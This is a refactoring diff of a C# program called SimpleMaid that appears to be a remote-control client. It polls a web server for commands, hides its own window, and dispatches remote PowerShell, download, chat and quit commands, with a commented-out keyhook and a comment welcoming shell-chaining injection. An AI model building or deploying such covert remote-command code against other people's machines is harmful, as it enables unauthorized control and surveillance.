@@ -61,7 +61,7 @@ namespace SimpleMaid
       var encoding = new UTF8Encoding();
       byte[] requestBody = encoding.GetBytes($"tag={tag}&value={value}&fmt=html");
 
-      var request = (HttpWebRequest)WebRequest.Create($"{resources.ServerAddress}/storeavalue");
+      var request = (HttpWebRequest)WebRequest.Create($"{Variables.ServerAddress}/storeavalue");
       request.Method = "POST";
       request.Credentials = CredentialCache.DefaultCredentials;
       request.ContentType = "application/x-www-form-urlencoded";
@@ -105,7 +105,7 @@ namespace SimpleMaid
       var encoding = new UTF8Encoding();
       byte[] requestBody = encoding.GetBytes($"tag={tag}&fmt=html");
 
-      var request = (HttpWebRequest)WebRequest.Create($"{resources.ServerAddress}/getvalue");
+      var request = (HttpWebRequest)WebRequest.Create($"{Variables.ServerAddress}/getvalue");
       request.Method = "POST";
       request.Credentials = CredentialCache.DefaultCredentials;
       request.ContentType = "application/x-www-form-urlencoded";
@@ -166,7 +166,7 @@ namespace SimpleMaid
       Console.Clear();
 
       desiredAppDirectory = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Application.CompanyName, Application.ProductName));
-      mainConfigFile = new FileInfo(Path.Combine(desiredAppDirectory.FullName, resources.ConfigName));
+      mainConfigFile = new FileInfo(Path.Combine(desiredAppDirectory.FullName, Variables.ConfigName));
 
       #region Console arguments
       bool rogueArgFound = false;
@@ -174,7 +174,7 @@ namespace SimpleMaid
       bool passArgFound = false; // <-- only need it for clarity
       bool langArgFound = false; // <-- only need it for clarity
 
-      string passArg = resources.DefaultPassword;
+      string passArg = Variables.DefaultPassword;
       string langArg = CultureInfo.InstalledUICulture.Name;
 
       if (args.Length >= 1)
@@ -183,15 +183,15 @@ namespace SimpleMaid
 
         for (int i = 0; i < args.Length; ++i)
         {
-          if (!rogueArgFound && (rogueArgFound = (args[i] == resources.RogueArgument)))
+          if (!rogueArgFound && (rogueArgFound = (args[i] == Variables.RogueArgument)))
             adjustedLength--;
 
-          if (!autorunArgFound && (autorunArgFound = (args[i] == resources.AutorunArgument)))
+          if (!autorunArgFound && (autorunArgFound = (args[i] == Variables.AutorunArgument)))
             adjustedLength--;
 
           if (adjustedLength >= 2)
           {
-            if (!passArgFound && (args[i] == resources.PasswordArgument))
+            if (!passArgFound && (args[i] == Variables.PasswordArgument))
             {
               passArg = (passArgFound = (i + 1 < adjustedLength)) ? args[i + 1] : passArg;
 
@@ -200,7 +200,7 @@ namespace SimpleMaid
               else
                 adjustedLength--;
             }
-            else if (!langArgFound && (args[i] == resources.LanguageArgument))
+            else if (!langArgFound && (args[i] == Variables.LanguageArgument))
             {
               langArg = (langArgFound = (i + 1 < adjustedLength)) ? args[i + 1] : langArg;
 
@@ -465,7 +465,7 @@ namespace SimpleMaid
 
     private static void exit()
     {
-      Thread.Sleep(int.Parse(resources.GeneralCloseDelay));
+      Thread.Sleep(Variables.GeneralCloseDelay);
       Environment.Exit(0);
     }
 
@@ -476,8 +476,8 @@ namespace SimpleMaid
 
     private static void configureMachine()
     {
-      int valueLength = machine.Length + resources.MachinesDelimiter.Length;
-      int realValueLimit = (int) Math.Floor(double.Parse(resources.IndividualValueLimit) / valueLength) * valueLength;
+      int valueLength = machine.Length + 1; // Variables.MachinesDelimiter
+      int realValueLimit = (int) Math.Floor(Variables.IndividualValueLimit / valueLength) * valueLength;
 
       int listIndex = -1;
       string currentList;
@@ -494,7 +494,7 @@ namespace SimpleMaid
 
       string machines = currentList;
 
-      while (resources.WebErrorMessage == Set($"machines{listIndex}", $"{machines}{machine}{resources.MachinesDelimiter}"))
+      while (resources.WebErrorMessage == Set($"machines{listIndex}", $"{machines}{machine}{Variables.MachinesDelimiter}"))
       {
         Thread.Sleep(1000);
       }
@@ -616,7 +616,7 @@ namespace SimpleMaid
       Console.CursorVisible = false;
 
       pas = null;
-      Thread.Sleep(int.Parse(resources.PasswordWeakDelay));
+      Thread.Sleep(Variables.PasswordWeakDelay);
 
       Console.CursorVisible = true;
     }
@@ -631,7 +631,7 @@ namespace SimpleMaid
       {
         ShowWindow(handle, SW_SHOW);
         Console.Beep();
-        Thread.Sleep(int.Parse(resources.GeneralCloseDelay));
+        Thread.Sleep(Variables.GeneralCloseDelay);
         ShowWindow(handle, SW_HIDE);
       }
     }
@@ -682,7 +682,7 @@ namespace SimpleMaid
 
       busyChatWise = false;
 
-      while (resources.WebErrorMessage == Set($"commands.{machine}", $"{resources.AnswerPrefix}{resources.MessageCommand},{ChatboxWindow.Visible}"))
+      while (resources.WebErrorMessage == Set($"commands.{machine}", $"{Variables.AnswerPrefix}{Variables.MessageCommand},{ChatboxWindow.Visible}"))
       {
         Thread.Sleep(1000);
       }
@@ -797,8 +797,8 @@ namespace SimpleMaid
     {
       reportThreadStart(resources.ChatStart);
 
-      string ans = resources.AnswerPrefix;
-      string sep = resources.CommandsSeparator;
+      string ans = Variables.AnswerPrefix;
+      char sep = Variables.CommandsSeparator;
 
       /* Command shortcuts here */
 
@@ -818,7 +818,7 @@ namespace SimpleMaid
         }
 
         #region Parsing message
-        string[] message_parts = sRemoteMessage.Split(new char[] { char.Parse(sep) },
+        string[] message_parts = sRemoteMessage.Split(new char[] { sep },
           StringSplitOptions.RemoveEmptyEntries);
 
         //частный случай m, еще две то есть
@@ -842,17 +842,17 @@ namespace SimpleMaid
     {
       reportThreadStart(resources.CommandStart);
 
-      string ans = resources.AnswerPrefix;
-      string sep = resources.CommandsSeparator;
+      string ans = Variables.AnswerPrefix;
+      char sep = Variables.CommandsSeparator;
 
-      string rep = resources.RepeatCommand;
-      string pow = resources.PowershellCommand;
-      //string key = resources.KeyhookCommand; /* app.State = Control.IsKeyLocked(Keys.CapsLock) ? "CAPS LOCK" : app.State; */
-      string mes = resources.MessageCommand;
-      string dow = resources.DownloadCommand;
-      string sho = resources.ShowCommand;
-      string hid = resources.HideCommand;
-      string qui = resources.QuitCommand;
+      string rep = Variables.RepeatCommand.ToString();
+      string pow = Variables.PowershellCommand.ToString();
+      //string key = Variables.KeyhookCommand.ToString(); /* app.State = Control.IsKeyLocked(Keys.CapsLock) ? "CAPS LOCK" : app.State; */
+      string mes = Variables.MessageCommand.ToString();
+      string dow = Variables.DownloadCommand.ToString();
+      string sho = Variables.ShowCommand.ToString();
+      string hid = Variables.HideCommand.ToString();
+      string qui = Variables.QuitCommand.ToString();
 
       while (busyCommandWise && internetAlive)
       {
@@ -868,8 +868,9 @@ namespace SimpleMaid
           continue;
         }
 
+        // TODO: Refactor using switch case
         #region Parsing command
-        string[] command_parts = sRemoteCommand.Split(new char[] { char.Parse(sep) },
+        string[] command_parts = sRemoteCommand.Split(new char[] { sep },
           StringSplitOptions.RemoveEmptyEntries);
         // Contains delimiter: if (command_parts[0] != sRemoteCommand)
 
@@ -942,7 +943,7 @@ namespace SimpleMaid
         }
         else if (qui == command_parts[0])
         {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + resources.GeneralOKMessage))
+          while (resources.WebErrorMessage == Set("commands." + machine, ans + Variables.GeneralOKMsg))
           {
             Thread.Sleep(1000);
           }
@@ -968,36 +969,36 @@ namespace SimpleMaid
 
     private static string hideCommand()
     {
-      if (Program.Hidden) return resources.GeneralOKMessage;
+      if (Program.Hidden) return Variables.GeneralOKMsg;
 
       ShowWindow(handle, SW_HIDE);
       Program.Hidden = true;
 
-      return resources.GeneralOKMessage;
+      return Variables.GeneralOKMsg;
     }
 
     private static string showCommand()
     {
-      if (!Program.Hidden) return resources.GeneralOKMessage;
+      if (!Program.Hidden) return Variables.GeneralOKMsg;
 
       ShowWindow(handle, SW_SHOW);
       Program.Hidden = false;
 
-      return resources.GeneralOKMessage;
+      return Variables.GeneralOKMsg;
     }
 
     private static string downloadCommand(string[] command_parts)
     {
       if (command_parts.Length < 2)
       {
-        return resources.IncompleteCommandErrMsg;
+        return Variables.IncompleteCommandErrMsg;
       }
 
       string downloadDirPath = null;
       string downloadFileName = null;
 
       bool quickDownload;
-      if ((quickDownload = (command_parts.Length == 2)) || resources.KeywordDefault == command_parts[2])
+      if ((quickDownload = (command_parts.Length == 2)) || Variables.KeywordDefault == command_parts[2])
       {
         downloadDirPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
         downloadFileName = urlToFile(command_parts[1]);
@@ -1005,8 +1006,8 @@ namespace SimpleMaid
       // TODO: Атаки типа "& && ||" - не баг, а фича!
       else if (command_parts.Length >= 3)
       {
-        string ev = resources.EvaluateCmdVariable;
-        char evd = char.Parse(resources.EvaluateCmdVariableEnd);
+        string ev = Variables.EvaluateCmdVariable;
+        char evd = char.Parse(Variables.EvaluateCmdVariableEnd);
 
         if (command_parts[2].Contains(ev))
         {
@@ -1087,14 +1088,14 @@ namespace SimpleMaid
         closeChatWindow();
       }
 
-      return $"{resources.MessageCommand},{ChatboxWindow.Visible}";
+      return $"{Variables.MessageCommand},{ChatboxWindow.Visible}";
     }
 
     private static string powershellCommand(string[] command_parts)
     {
       if (command_parts.Length < 2)
       {
-        return resources.IncompleteCommandErrMsg;
+        return Variables.IncompleteCommandErrMsg;
       }
 
       for (int i = 2; i < command_parts.Length; ++i)
